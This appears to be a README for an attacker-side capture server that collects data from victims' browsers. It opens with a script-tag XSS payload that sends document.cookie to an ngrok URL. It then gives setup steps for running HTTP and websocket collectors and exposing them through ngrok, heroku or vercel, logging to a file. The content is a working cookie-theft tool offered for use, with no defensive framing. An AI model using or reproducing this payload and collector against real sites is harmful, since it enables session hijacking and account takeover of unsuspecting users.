## info
http server capture user data by either sending the data in a query or in the body.

#### Capture user cookies ####

```js
  <script>
      fetch(`https://NGROK-URL?cookie=${encodeURIComponent(document.cookie)}`)
  </script>
```

_____________________________

### Running the servers

The first step is to install depencencies:

```bash
npm install
```

Then you can run the regular HTTP server (CORS enabled):

```bash
npm run http
```

Or the websocket server:

```bash
npm run ws
```

_____________________________

### HTTPS/WSS/External access

You can use ngrok to connect via HTTPS, WSS or externally without changing any configuration.
https://dashboard.ngrok.com/get-started

Once it's installed, you can then expose the HTTP server:

```bash
ngrok http 8000
```

Or the Websocket server:

```bash
ngrok http 8080
```

_Just use wss://NGROK_URL  instead of https://NGROK_URL for wss connections_
<br>
if you dont want to use ngrok you can host them on heroku or vercel but insted of console.log write to a log file 
